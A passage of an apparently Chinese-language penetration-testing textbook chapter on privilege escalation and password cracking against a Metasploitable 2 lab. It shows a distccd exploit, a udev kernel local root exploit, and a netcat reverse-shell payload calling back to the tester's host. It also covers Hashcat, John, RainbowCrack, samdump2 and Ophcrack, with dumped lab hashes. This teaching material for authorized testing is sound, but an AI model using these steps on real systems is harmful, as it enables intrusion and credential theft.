#
```
第10章 提升權限(許可權)
上一章介紹了利用已識別的漏洞進行漏洞映射的有關流程。利用漏洞的最終目的是獲取被測系統的最高權限(許可權)，即Windows作業系統中管理員帳戶的權限(許可權)，或UNIX作業系統中root帳戶的權限(許可權)。
所以在利用漏洞之後就應當提升權限(許可權)。提升權限(許可權)的實質是通過利用漏洞的手段提高自身的操作權限(許可權)。
提升權限(許可權)的方式分為兩類。
● 縱向提權（vertical privilege escalation）：如果低權限(許可權)角色（的用戶）能夠獲得高權限(許可權)角色的權限(許可權)，則這種提權就可稱為縱向提權。例如，如果在提權之後，內容管理系統（CMS）的某個用戶能夠使用管理員的功能，那麼這種提權就是縱向提權。
● 橫向提權（horizontal privilege escalation）：如果獲取了同級別角色的權限(許可權)，這種提權就屬於橫向提權。例如，如果在網上銀行裡，用戶 A 獲取了用戶 B 的權限(許可權)，他可以替用戶B進行操作，那麼這種提權就屬於橫向提權。
越權提升權限(許可權)的攻擊向量，大體可分為以下幾種。
● 利用本地漏洞。
● 利用目標系統上的配置缺陷。例如，如果 home 目錄可被其他使用者訪問，那麼攻擊人員可就可以使用目錄裡的SSH私有金鑰訪問其他主機。
● 利用目標系統的弱密碼。
● 嗅探網路流量以捕獲他人的用戶名和密碼。
● 偽造網路資料包。
本章不會討論利用配置缺陷的滲透方法。
10.1 利用本地漏洞
這一小節，我們將使用本地漏洞的利用程式（local exploit）提升權限(許可權)。
我們的演示環境如下。
● IP 為192.168.56.102，運行Metasploitable 2 的虛擬機器充當被測主機。
● IP 為192.168.56.101，運行Kali Linux 的虛擬機器充當測試平臺。
首先，我們要掃描被測主機上的網路服務。本文通過下述指令進行埠掃描。
nmap –p- 192.168.56.102
我們通過-p-選項，令Nmap掃描被測主機的所有埠（1～65535）。
在掃描結束之後，Nmap會列出所有開放的埠（見圖10.1）。
 
圖10.1
我們通過網上資料確定distccd服務存在漏洞，可被用來執行任意指令。這個服務是一種分散式的編譯工具，可協調多台主機協助完成大規模的編譯任務。
然後，我們要確定Metasploit中是否有相應的exploit程式（見圖10.2）。
上述資訊表明，Metasploit確有攻擊distccd服務漏洞的exploit程式。
接下來，我們通過下述指令利用這個漏洞（見圖10.3）。
 
圖10.2
 
圖10.3
我們通過這個exploit利用了該服務的漏洞。而後，我們通過作業系統的指令看到已經獲取到的權限(許可權)是daemon的權限(許可權)。
在進一步操作之前，我們應到獲取被測主機的詳細資訊。現在，我們通過下述指令查看被測主機的內核版本。
uname –r
通過上述指令，我們瞭解到目標主機的內核是2.6.24-16-server。
我們搜索 exploit-db 的資料庫，發現某個 exploit 程式（http://www.exploitdb.com/exploits/8572/）可將我們的權限(權限(許可權))提升為root權限(許可權)。下一步，我們在測試主機上保存exploit程式，然後使被測主機從測試主機下載這個程式。有關指令如圖10.4所示。
在被測主機上下載exploit之後，我們在被測主機上使用gcc指令編譯exploit。
gcc privs.c -o privs
現在，我們製備好了exploit程式。在分析了exploit的原始程式碼之後，我們發現這個exploit程式需要在命令列裡使用 udevd netlink socket 的 PID（Process Identifier）作為參數。為此，我們使用下述指令獲取這個PID值。
 
圖10.4
cat /proc/net/netlink
所獲信息如圖10.5所示。
 
圖10.5
您也可以通過單條指令獲取udev服務的PID。
ps aux | grep udev
上述指令的輸出結果如下。
root 2391 0.0 0.1 2216 660 ? S <S 21:06 0:01 / sbin /udevd -daemon
即，udev服務的PID是2390。
在實際的滲透測試工作之中，您可能要安裝一台內核與被測主機完全相同的測試主機，以測試exploit程式。
從被測主機上收集的資訊判斷，目標主機上安裝有NetCat程式。成功運行exploit程式之後，我們就有了被測主機的 root 權限(許可權)。我們再在被測主機上運行 netcat 程式，讓它反向連接到測試主機。通過其原始程式碼可知，這個 exploit 把檔案名為 run 的可執行檔當作其payload。所以，我們需要製備這個payload。
echo '#!/bin/bash' > run
echo '/bin/netcat -e /bin/bash 192.168.56.101 31337' >> run
在執行payload之前，我們還要在測試主機上啟動netcat的監聽服務，以受理被測主機發起的連接。
nc -vv -l -p 31337
最後，我們在被測主機上運行下述指令。
./privs 2390
此後，我們可在測試主機上看到圖10.6所示的資訊。
 
圖10.6
通過whoami指令，我們可看到已經成功提升自身權限(許可權)為root的權限(許可權)。
10.2 密碼攻擊
密碼是當代系統驗證使用者身份的主要手段。只要某人能夠遞交正確的用戶名和對應的密碼，系統就允許這個人登錄並允許他使用該帳號的所有資源。
構成身份驗證的要素可分為三大類。
● 基於所知（something you know）。這類認證要素通常被稱為身份驗證的第一要素。密碼就屬於這類要素。理論上來說，只有特定秘密的持有人才能“知道”有關秘密。然而不幸的是，這類資訊很容易外泄，也易於被他人獲悉。因此，機要系統應當採取其他方式的身份驗證方式。
● 基於所有（somethingyou have）。這類認證要素通常被稱為身份驗證的第二要素。安全權杖、門禁卡等都屬於這類認證要素。向系統出示相應的安全持有物後，持有者即可獲得登錄權。不過，持有物（資訊）可被複製，所以這種身份驗證方法並非沒有缺陷。
● 基於特徵（something you are）。這類認證要素通常被稱為身份驗證的第三要素。相比前兩者而言，這類資訊的身份驗證方法更為安全。然而，已經出現了攻擊這種驗證方法的實際案例。指紋識別和視網膜識別都屬於驗證這類要素的手段。
如果有較高的安全需求，就應當驗證一個以上的驗證要素。高規格的安全系統往往驗證第一要素和第二要素。因為這種方法驗證了兩種身份驗證要素，因此被稱為雙要素驗證。
然而不幸的是，我們的經驗表明，目前多數系統廣泛依賴單一的密碼驗證。作為滲透測試人員，您應當在測試過程中驗證密碼的安全性。
根據攻擊方式的不同，密碼攻擊可分為以下幾類。
● 離線攻擊：這種攻擊手段意在獲取目標主機上的密碼 hash 檔，並將該檔複製到攻擊人員的主機。此後，攻擊人員就可使用密碼破解工具破解密碼檔。這種方法的優點是無須顧及被測主機上的密碼阻止策略（帳戶鎖定等設置），因為有關破解工作是在攻擊人員的主機上完成的。
● 線上攻擊：如果採用這種方法，攻擊人員將猜測用戶名和對應的密碼。因為需要多次猜測使用者密碼，所以這種方式因為可能會觸發帳戶鎖定等保護機制。
10.2.1 離線攻擊工具
這類工具用於實施離線密碼攻擊。通常情況下，您會用這種工具破解高權限(許可權)帳戶的密碼，所以這些工具往往用於縱向提權。
既然已經有了某種權限(許可權)的帳戶資訊，為什麼還需要其他帳戶的登錄資訊呢？在對某個系統進行滲透測試時，受被測主機配置的影響，所用帳戶可能無法運行某些特定的應用程式。這種情況下，您就無法進行下一步測試。但是，如果使用常規用戶身份登錄，您就可以正常運行那些程式了。這是需要獲取其他帳戶資訊的原因之一。
現在的主流系統在存儲密碼的時候都只保存密碼的hash（雜湊值）。通過雜湊演算法，密碼可被轉換為固定長度的消息摘要。這種轉換是不可逆的單向轉換。所謂單向轉換是指：這種演算法可將既定原始值輕鬆地轉換為某個雜湊，而沒有實用的方法可以從雜湊值逆向推導出原始的輸入值。
過去，電腦系統保存密碼明文。如果攻擊人員獲取到密碼檔，那麼他就獲取了全部的密碼。現在，即使攻擊人員獲取了密碼檔，他們也只能獲取密碼的雜湊值，還是無法輕易獲取原始密碼。
密碼破解是以窮舉的方式做雜湊碰撞。如果所測密碼的雜湊值與檔中的雜湊值相符，就意味著猜測到了正確的密碼。
在利用SQL注入漏洞之後，測試人員就可匯出整個資料庫，繼而可找到密碼的雜湊值。離線破解工具可以幫助測試人員從雜湊值中獲取記錄的原始資訊。
在一次滲透測試項目裡，我們匯出了整個資料庫。這個資料裡存有整個E-mail系統的用戶名和密碼。借助這些資訊，我們以某個關鍵人物的身份登錄到了E-mail系統，並獲取了各種機要系統的帳戶資訊。
1．hash-identifier
這款工具可識別雜湊的類型。只有知道被測系統採用了什麼雜湊演算法，才能使用密碼破解工具破解雜湊值。有關hash-identifier程式能夠支援的加密演算法，請參見作者的官方網站：http://code.google.com/p/hash-identifier/。
假如我們獲取了下述雜湊值。
d111b38c0e73bc867c4bad4023606a0e0df64c2f
我們可直接使用hash-identifier指令，並在HASH值欄位輸入雜湊值。具體過程如圖10.7所示。
 
圖10.7
上述資訊表明這個值是SHA-1型的雜湊值。接下來，我們可以使用Hashcat程式破解這個雜湊值中的資訊。
不過這個程式的可靠性有待提高。我們可能會遇到下述情況。
HASH: 8846f7eaee8fb117ad06bdd830b7586c
Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).
(strtolower($username)))
即，hash-identifier 認為這個值屬於 MD5 或 MD4 型的雜湊。不過這個雜湊是經NTLM演算法得來的。
2．Hashcat
Hashcat是一款免費的多執行緒密碼破解工具。目前，它可破解80種演算法（http://hashcat. net/hashcat/#features-algos）的雜湊值。Hashcat 程式完全依賴 CPU 運算，它要比利用GPU（Graphical Processing Unit）運算的密碼破解程式要慢一些。
Hastcat支援6種攻擊模式。
● Straight：程式會從文字檔裡逐行讀取資料，並把這些資料當作密碼的備選值。這是預設的攻擊模式，通常也被稱作字典式攻擊模式。
● Combination（組合模式）：Hashcat 將會把字典中的單詞進行排列組合，再做雜湊碰撞。例如，如果字典中含有以下單詞
○ password
○ 01
那麼Hashcat將會嘗試的密碼將是：
○ passwordpassword
○ password01
○ 01password
○ 0101
● Toggle Case（窮舉大小寫組合）：程式將會嘗試每個字典單詞的各種大小寫組合。
● Brute force（暴力破解）：程式將會從關鍵字空間中取樣再做排列組合。這種攻擊模式正在被 mask attack 所取代。例如，如果我們設定程式測試 A-Z 組成的雙字元密碼，那麼Hashcat將會嘗試AA到ZZ的所有英文字元組合。
● Permutation（排列組合）：對於字典裡每個備選密碼，程式將會按照字元進行各種排列組合。例如，如果字典裡有AB這個備選密碼，那麼Hashcat將會測試的密碼如下：
○ AB
○ BA
● Table-lookup（表查詢）：程式將把字典裡每個備選密碼的每個字元都當作對應的mask進行處理。這是一種自動匹配模式的窮舉攻擊，詳細情況請參見http://hashcat. net/wiki/doku.php?id=table_lookup_attack。
Hashcat需要相應的字典檔。您可從下述連結中下載適用的字典。
● http://www.skullsecurity.org/wiki/index.php/Passwords。
● http://cyberwarzone.com/cyberwarfare/password-cracking-megacollection-password-cracking- word-lists。
● http://hashcrack.blogspot.de/p/wordlist-downloads_29.html
● http://packetstormsecurity.com/Crackers/wordlists/
● http://blog.g0tmi1k.com/2011/06/dictionaries-wordlists.html
● http://www.md5decrypter.co.uk/downloads.aspx
現在開始演示Hashcat的適用方法。
如果在執行Hashcat的時候指定--help選項，您將看到Hashcat的説明資訊。我們可通過這些説明資訊查看各個選項的使用方法。
假設我們獲取了檔案名為test.hash的密碼檔，並從中找到了下述雜湊值。
5f4dcc3b5aa765d61d8327deb882cf99
我們可使用rockyou.txt檔作為Hashcat的密碼字典。簡便起見，我們可把密碼檔和字典檔放在同一個目錄下。用pwd指令查看目前的目錄的目錄名。
然後我們通過下述指令，令Hashcat以預設的攻擊方式測試密碼。
hashcat -m 100 test.hash rockyou.txt
其中，選項-m 100 指定了hash 的類型為SHA-1。
我們可看到圖10.8所示的資訊。
 
圖10.8
上述資訊表明，程式成功的破解了該雜湊值。即，密碼原文是password01。
預設攻擊模式的破解速度比較快。如果密碼字典沒有命中正確的密碼，您就需要嘗試其他的攻擊模式。
Hashcat系列有很多密碼破解工具。其中部分程式可以使用GPU破解密碼；所以只要您的電腦裝有相容的GPU，那麼破解速度還是相當理想的。請注意，無法在VM虛擬機器裡使用基於GPU破解的程式，因為在虛擬機器裡運行的程式無法直接調用物理主機的硬體。此外，顯卡的相容性也很重要。要使用基於GPU運算的破解程式，您的顯卡需要支援CUDA（NVidia）或OpenCL（AMD）技術。在Hashcat系列裡，支援基於GPU運算的破解程式有下面幾下。
● oclhashcat-lite：它是一款基於GPU 運算的密碼破解程式。在Hashcat 系列工具裡，它算得上是速度最快的破解工具。不過它支持的雜湊演算法有限（約30種），而且只支持markov、brute force 和mask 模式的密碼攻擊。
● oclhashcat-plus：它是一款基於 GPU 運算的密碼破解程式，支援多數雜湊演算法。這個程式針對字典式攻擊進行了各種優化，可同時破解多個雜湊值。oclhashcat-plus 工具支援的攻擊模式有brute foce（以mask attack 模式實現）、combinator attack、dictionary attack、hybrid attack、mask attack和基於規則的攻擊。
如需詳細瞭解密碼字典的有關情況，請參見：
● Hybrid attack（https://hashcat.net/wiki/doku. php?id=hybrid_attack）
● Mask attack（http://hashcat.net/wiki/doku. php?id=mask_attack）
● Rule-basedattack（http://hashcat.net/wiki/doku. php?id=rule_based_attack）
3．RainbowCrack
彩虹表破解（RainbowCrack）是利用彩虹表來破解雜湊資料的工具。它實現了由Philippe Oechslin提倡的“以空間換時間”的技術思想。
如需詳細瞭解這種技術，請參見Philippe Oechslin 的論文Making aFaster Cryptanalytic Time-Memory Trade-Off: http://lasec.epfl. ch/pub/lasec/doc/Oech03.pdf
這種破解密碼的方式有別于暴力破解。暴力破解攻擊首先計算密碼的備選值（字典裡的密碼）的雜湊值，然後再將計算出來的雜湊值與獲取到的雜湊值進行對比。如果這兩個值相等，則可確定雜湊值的原始內容即是密碼；否則就說明密碼不正確。
彩虹表破解法的效率也高於暴力破解法。這是因為暴力破解法必須計算字典內容的雜湊值，然後進行匹配。而使用“以空間換時間”技術的彩虹表破解法，事先就計算好了字典各項的雜湊值，破解過程只是簡單的數值比較，所以效率更高。
請注意：RainbowCrack程式速度不快，而且不支援多執行緒。人們已經修改了這個程式，使之支援多執行緒技術和部分顯卡採用的 CUDA 技術。讀者可從下列位址下載這個改進版的rcrack的程式： https://www. freerainbowtables.com/en/download/。
Kali Linux收錄了RainbowCrack的三大工具。在破解雜湊時，您必須依次使用這些工具。
● rtgen：生成彩虹表的程式。生成彩虹表的計算過程也被稱為彩虹表的預計算階段。彩虹表包含字典、雜湊值、雜湊演算法、字元集以及字典的長度範圍。彩虹表的預計算相當費時。但是生成彩虹表之後，彩虹表破解法將比暴力破解法的效率要高上不少。rtgen 程式支援的演算法有 LanMan、NTLM、MD2、MD4、MD5、SHA1 以及RIPEMD160。
● rtsort：對rtgen 生成的彩虹表進行排序的工具。
● rcrack：利用彩虹表査找雜湊值的工具。
如需啟動生成彩虹表的rtgen工具，可在終端視窗中執行下述指令。
rtgen
上述指令將會顯示簡單的使用說明，以及兩個指令範例。
本例將使用這個程式製作兩個彩虹表，並使其符合下述要求。
● hash algorithm（演算法）：md5
● charset（字元集）：loweralpha
● plaintext_len_min：1
● plaintext_lan_max：5
● rainbow_table_index：0
● rainbow_ chain_length：2000
● rainbow_chain_count：8000
● part_index：0
依照以上要求，製作第一個彩虹表所需的指令如下所示。
rtgen md5 loweralpha 1 5 0 2000 8000 testing
此後，螢幕上會顯示圖10.9所示的資訊。
 
圖10.9
第一個彩虹表的檔案名為 md5_loweralpha#1-5_0_2000x8000_0.rt，並被保存在目錄/usr/share/rainbowcrack/之下。
製作第二個彩虹表所需的指令如下所示。
rtgen md5 loweralpha 1 5 1 2000 8000 0
在作者的系統中，生成上述兩個彩虹表總耗時為 3 分鐘左右。第二個彩虹表被保存為md5_loweralpha#1-5_1_2000x8000_0.rt文件。
請注意，彩虹表的製作過程十分耗時，而且彩虹表檔非常大。如果需要估算彩虹表的耗時情況，可使用Winrtgen（http://www.oxid.it/ downloads/winrtgen.zip）程式。
Winrtgen 是Windows的應用程式。若要在Kali Linux中運行它，就需要使用Wine環境。
如果不想自己製作彩虹表，您可以從網上下載一些現成的彩虹表。例如，下述網站就提供了彩虹表下載服務：
● http://www.freerainbowtables.com/en/tables/；
● http://rainbowtables.shmoo.com/。
Winrtgen程式的圖形介面如圖10.10所示。
 
圖10.10
rtsort
製作彩虹表之後，應當對其進行排序。此時可選用rtsort程式。
若要在指令行中啟動rtsort程式，可在終端中執行下述指令。
rtsort
上述指令將會顯示簡單的使用說明以及指令範例。在本例中，我們將通過下述指令對第一個彩虹表進行排序。
rtsort md5_loweralpha#1-5_0_2000x8000_0.rt
md5_loweralpha#1-5_0_2000x8000_0.rt:
1176928256 bytes memory available
loading rainbow table...
sorting rainbow table by end point...
writing sorted rainbow table...
然後，採取相同的操作對第二個彩虹表進行排序。
rtsort md5_loweralpha#1-5_1_2000x8000_0.rt
md5_loweralpha#1-5_1_2000x8000_0.rt:
1177255936 bytes memory available
loading rainbow table...
sorting rainbow table by end point...
writing sorted rainbow table...
rtsort工具會用排序的結果覆蓋原文件。
在rtsort程式的運行期間，請耐心等待程式結束。切勿中斷程式，否則將會破壞彩虹表檔。
接下來，我們將使用5個字元字典的彩虹表碰撞（破解）密碼的MD5雜湊值。請注意，因為我們使用了兩個彩虹表，所以成功率大約為86%。
rcrack
要在指令行中啟動rcrack程式，可在終端中執行下述指令。
rcrack
上述指令將會在螢幕上顯示簡單的使用說明以及指令範例。
本次將破解abcde 的MD5 散列值ab56b4d 92b40713acc5af89985d4b786。
rcrack /usr/share/rainbowcrack/*.rt -h
ab56b4d92b40713acc5af89985d4b786
上述指令的運行結果如圖10.11所示。
 
圖10.11
上述結果表明，rcrack程式成功地破解（碰撞）了給定雜湊值的明文。整個破解過程的耗時大約為2秒。
rcrack的改進版本叫做rcracki_mt（https://www.freerain bowtables. com/en/download/）。改進版支援混合（hybrid）和索引（indexed）表，並且採用了多執行緒技術。
4．samdump2
Windows 2K/NT/XP/Vista 系統的帳戶密碼，以雜湊值的形式儲存於 SAM 的檔型資料庫裡。samdunip2（http://sourceforge.net/projects/ophcrack/files/samdump2/）可破解這種雜湊。無需SysKey（System Key），samdump2 程式就可破解密碼的雜湊值。SysKey是由Windows NT Service Pack 3引入的概念，它是保護 Windows SAM資料庫的加密金鑰。
如需啟動samdump2，可在命令列中輸入如下命令。
samdump2
上述指令將會顯示簡單的使用說明。
獲取Windows密碼雜湊值的方法有很多。
● 第一種方法：直接使用samdump2 程式分析Windows 系統和SAM檔。有關資訊都保存在 c:\%windows%\system32\config目錄下。不過，在Windows運行期間，該目錄被鎖定保護。所以，可通過Linux Live CD（例如Kali Linux）啟動電腦系統，然後掛在 Windows 系統的磁碟分割。在此之後，您就可以把Windows的SAM檔複製到Kali主機上。
● 第二種方法：使用pwdump程式或同類型的相關工具把Windows帳戶的密碼雜湊值匯出來。
● 第三種方法：參見上一章 Meterpreter 腳本的使用方法，再執行hashdump命令把密碼的雜湊值匯出來。使用這種方法的前提是您首先要成功利用好主機的漏洞，並能夠上傳Meterpreter的腳本。
下一步，我們將演示Windows XP SP3 密碼的破解方法。假設您已經取得system 和sam檔，將它們以同檔案名保存在home目錄下，那麼破解雜湊值的命令如下所示。
samdump2 system sam -o test-sam
通過上述指令，我們把samdump2的輸出結果保存為檔test-sam。這個檔的內容如下所示。
Administrator:500:e52cac67419a9a22c295285c92cd06b4:b2641aea8eb4c00ede89c d2b7c78f6fb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08 9c0:::
HelpAssistant:1000:383b9c42d9d1900952ec0055e5b8eb7b:0b742054bda1d884809e 12b10982360b:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:a1d6e496780585e33 a9ddd414755019a:::
tedi:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08 9c0:::
接下來就可以用密碼破解工具破解test-sam檔的雜湊值。您可以選用下文介紹的John和Ophcrack。
5．John
John the Ripper/John（http://www.openwall.com/john/）是一款破解密碼雜湊的工具。目前，這款工具可以破解40 多種類型的密碼雜湊。它可破解常見的 DES、MD5、LM、NT、crypt、NETLM和NETNTLM型雜湊。雖然破解雜湊的軟體有很多，但是DES和crypt型雜湊的破解功能使John成為一枝獨秀。
如需啟動John程式，可在終端中使用下述指令。
john
上述指令將會在螢幕上顯示簡單的使用說明。
John的密碼破解模式分為以下4種。
● 字典模式（Wordlist mode）：在這種模式下，使用者只需要提供字典檔（wordlist）就可以破解密碼檔。字典檔是包含密碼備選值的文字檔，檔中的每行內容都將被當作一個用來進行碰撞測試的候選密碼。這種模式具備“字詞變化”（就是某種規則）的功能，（這種規則）可自動套用在每行的備選密碼中，以提高破解的概率。--wordlist=選項用於指定字典檔。這種字典可以是您自己製作的字典，也可以是他人製作的字典。許多網站都提供字典下載。例如， Openwall Project（John 的官方網站）就提供字典下載服務，詳情請參見http://download. openwall.net/pub/wordlists/。
● 簡易破解模式（Single crack mode）：這是John程式作者推薦的應當首先嘗試的破解模式。在這種模式下，John會使用登錄名、全名和用戶的home資料夾名作為測試的候選密碼，並使用候選密碼來碰撞（破解）相應帳戶的密碼，或者破解使用相同salt加密的密碼雜湊。就結果而言，這種模式比字典模式要快得多。
● 增強型破解模式（Incremental mode）：這種模式是John 各種模式裡功能最強大的破解模式，它會嘗試所有可能的密碼組合。不過，如果使用者不設置密碼的測試區間，程式將會非常耗時。測試區間由密碼長度的上限和字元集的設置構成。要這種破解模式破解密碼，必須指定相應的破解模組。程式預設的模組有All、Alnum（字母和數位）、Alpha（字母）、Digits（數位）和 Lanman；您也可以根據實際需要自訂一個測試模組。
● 外部模式（External mode）：在這種模式下，使用者可以指定John程式使用外部（源）程式破解密碼。如需使用這種模式，您首先應在設定檔裡創建一個[List.External:MODE]的節點（section）。其中，MODE就是這種模式的一個（任意）名字，而這個節點的內容應當是C語言編寫的生成候選密碼的各種函數。以這種模式啟動程式之後，John會編譯這個節點內的原始程式碼，並使用它進行密碼破解。如需瞭解更多資訊，可訪問John的官方網站：http://www.openwall.com/john/doc/EXTERNAL.shtml。
如果沒有明確指定John的破解模式，它將會按預設順序進行破解：首先採用簡易破解模式，然後嘗試字典式破解，最後進行增強式破解。
在使用John程式之前，您首先需要拿到包含密碼資訊的雜湊檔。UNIX一類的作業系統，密碼雜湊多數都保存在shadow檔和passwd檔裡。另外，只有root級別的用戶才能要讀取shadow檔。
在獲取密碼資訊檔之後，您需要對這些檔做一些處理；否則John無法破解其中的雜湊。好在John提供的unshadow程式可進行這種處理。
我從Metasploitable2的虛擬機器中提取出/etc/shadow和/etc/passwd，然後把它們放在同一個目錄裡，並分別重命名為etc-shadow和etc-passwd。然後，我使用下述指令將shadow和passwd檔進行合併處理。
unshadow etc-passwd etc-shadow > pass
以下是pass檔的部分內容。
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:justa user,111,,:/home/user:/bin/bash
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
第二個欄位為空的行，沒有密碼資訊。可刪除這些行以加快密碼破解的速度。
可使用下述指令破解密碼；其中，pass就是需要破解的密碼檔，也就是剛剛合併處理的那個檔。
john pass
如果John程式能夠破解這些密碼，它就會把破解的密碼儲存為john.pot。
如需查看破解出來的密碼，可使用下述指令。
john --show pass
在本例中，John快速地破解出了多個密碼，並返回圖10.12所示的資訊。
 
圖10.12
由下表可見，John成功破解出了多個密碼。
 
上述密碼檔（pass檔）包含有7個帳戶密碼的資訊，John成功地破解出了其中的6組密碼。它沒能快速破解出root的密碼。
如需清空John程式的緩存，就要刪除檔/root/.john/john.pot。
要破解Windows密碼，就要使用pwdump（工具集）把SYSTEM和SAM檔中的密碼雜湊值（LM和/或NTLM演算法）提取出來。如需瞭解這個工具集的各款工具，請參見http://www. openwall.com/passwords/pwdump。Kali Linux收錄了其中的samdump2程式。
接下來，我們使用字典檔 password.lst 破解 samdump2 匯出的雜湊信息。此時需要使用的指令如下所示。
john test-sam --wordlist=password.lst --format=nt
上述指令的運行資訊如圖10.13所示。
 
圖10.13
上述資訊表明，test-sam檔中的管理員密碼如下所示。
password01
然後我們通過下述指令查看破解的結果（見圖10.14）。
john test-sam --format=nt --show
 
圖10.14
上述資訊表明：John 成功破解出了 Windows 主機的管理員密碼，但是它未能破解出常規使用者tedi的密碼。
6．Johnny
如果您對John程式複雜的命令列指令望而卻步，那麼您可能會喜歡它的圖形化版本——Johnny（http://openwall.info/wiki/john/johnny）。Johnny 程式的圖形化介面非常友好，您不必在命令列裡逐一指定John程式的各個選項。
如需啟動Johnny程式，可在終端中使用下述指令。
johnny
上述指令將啟動Johnny的圖形化介面。
我們使用這個程式分析前一個例子中 Metasploitable 2 系統的雜湊。其分析結果如圖10.15所示。
 
圖10.15
上述資訊表明，Johnny破解雜湊的能力和John程式相同。
7．Ophcrack
Ophcrack是一款基於彩虹表的破解工具。它可破解LM和NTLM型的Windows的密碼雜湊。這款程式有命令列版本，也有圖形化介面的版本。因為它屬於彩虹表破解工具，所以Ophcrack採用的破解策略同樣是以空間換時間的策略。
Windows NT 和早期的 Windows 系統（包括 2000/XP）採用 LAN Manager（LM）保存使用者密碼的雜湊。如需深入瞭解LM雜湊，請參閱http://technet.microsoft.com/en-us/library/dd277300.aspx。
後來，微軟推出了NT LAN Manager（NTLM）雜湊，以替代LM雜湊。NTLM 演算法可對帳號進行認證，並實現了會話的完整性和保密性。Windows NT SP4開始，Windows系統開始逐步採納更為安全的NTLM v2的演算法。這種新演算法增強了伺服器和使用者之間的認證功能。微軟已經不再推薦用戶使用NTLM雜湊，具體原因請參見http://msdn.microsoft. com/en-us/library/cc236715.aspx。
有關NTLM 和NTLM v2的區別，請參見http://msdn.microsoft.com/en-us/library/cc236701.aspx。
如需在命令列中啟動Ophcrack程式，可在終端中使用下述指令。
ophcrack-cli
上述指令將會在螢幕上顯示簡單的使用說明及相關範例。
如需啟動Ophcrack GUI，可在終端中使用下述指令。
ophcrack
上述指令將會啟動Ophcrack GUI（圖形化介面）。
Ophcrack 需要彩虹表才能進行破解雜湊。所以，我們先要先從其官方網站（http://ophcrack.sourceforge.net/tables.php）下載彩虹表。目前，官方免費提供Windows XP 和Vista 彩虹表。對於字元集為數位和英文大小寫字母的密碼、且長度在10～14個字元以內的常規密碼，它的破解成功率高達99%以上。
以xp_free_small為例。下載它之後，我們將其解壓縮並把解壓後的檔放進xp_free_small 目錄。然後Windows XP 的散列檔以pwdump 格式保存為檔test-sam。
接下來，我們使用下述命令破解先前獲取的雜湊。
ophcrack -d fast -t fast -f test-sam
在運行期間，Ophcrack的提示資訊如下。
Four hashes have been found in test-sam:
Opened 4 table(s) from fast.
0h 0m 0s; Found empty password for user tedi (NT hash #1)
0h 0m 1s; Found password D01 for 2nd LM hash #0
0h 0m 13s; Found password PASSWOR for 1st LM hash #0in table XP free fast #1 at column 4489.
0h 0m 13s; Found password password01 for user Administrator (NT hash #0)
0h 0m 13s; search (100%); tables: total 4, done 0, using 4; pwd found 2/2.
程式的運行結果如下。
Results:
username / hash　LM password　　NT password
Administrator　　PASSWORD01　　password01
tedi　　　　 empty 　　 empty
可見，Ophcrack 破解了相應使用者的所有密碼。
8．Crunch
Crunch（http://sourceforge.net/projects/crunch-wordlist/）是一款基於使用者標準來創建密碼字典（wordlist）的工具。密碼字典通常用於暴力破解。
如需啟動Crunch程式，可在終端中使用下述指令。
crunch
上述指令將會在螢幕上顯示簡單的使用說明及相關範例。
如果要創建由字母組成的密碼長度在5個字元以內密碼字典，並指定密碼字典的檔案名為5chars.txt，我們可使用下述指令。
crunch 1 5 –o 5chars.txt
上述指令的輸出內容如圖10.16所示。
 
圖10.16
文件5chars.txt的內容如下。
a
b
c
...
zzzzx
zzzzy
zzzzz
這個檔的內容表明，上述指令創建了從a到zzzzz的各種字串，並將其組織為密碼字典。
接下來，我們要創建由小寫字母和數位組成的密碼長度在 4 個字元以內的密碼字典，並指定字典檔的檔案名為wordlist.lst。
根據以上需求，我們需要使用下述指令。
crunch 1 4 -f /usr/share/crunch/charset.lst lalpha-numeric
-o wordlist.lst
上述指令的輸出內容如下。
Crunch will now generate the following amount of data: 8588664 bytes
8 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1727604
100%
在我的主機上執行上述指令，耗時大約1.5分鐘。密碼字典wordlist.lst的內容如下。
a
b
c
...
9997
9998
9999
10.2.2 線上破解工具
前文介紹了幾款離線破解密碼的工具。本節將介紹線上破解密碼的工具。所謂線上破解，意味著這類工具在與被測主機建立連接之後才能破解密碼。
本節將要介紹的工具可分為以下幾類：
● 製作密碼字典；
● 搜索密碼的雜湊值；
● 線上密碼破解工具。
本節首先會講解兩款根據被測網站資訊製作密碼字典的工具，然後會介紹幾款線上破解密碼的工具。
線上密碼破解工具會採取常規使用者登錄的方式，以用戶名和密碼登錄遠端主機的網路服務。它會不斷嘗試各種用戶名和密碼，直到發現正確的帳戶資訊為止。
這類工具存在暴露的風險。因為測試主機會直接連接到被測主機，所以可能會被對方發現甚至會被遮罩。因為這些工具使用的是標準登錄過程，所以在破解效率方面比離線攻擊軟體的效率更高。
雖然線上攻擊工具速度不快，也可能觸發帳戶鎖定機制，但是對於 SSH、Telnet 和FTP這類服務來說，線上攻擊是密碼破解的唯一方式。在進行線上的密碼攻擊時，務必加倍小心；尤其是在攻擊 Active Directory（AD）伺服器的帳戶時，暴力破解可能會鎖定所有的域帳戶。要避免發生鎖定帳戶的情況，不僅要事先查看密碼和使用者鎖定策略，在測試密碼時最好還要使用同一個密碼對所有用戶名進行測試（輪換用戶名，而不是輪換密碼）。
1．CeWL
CeWL（Custom Word List）（http://www.digininja.org/projects/cewl.php）是一款以爬蟲模式在指定URL上收集單詞的工具。把它收集到的單詞納入密碼字典，可提高密碼破解工具（例如John the Ripper）的命中率。
CeWL程式有很多選項，其中較為常用的如下所示。
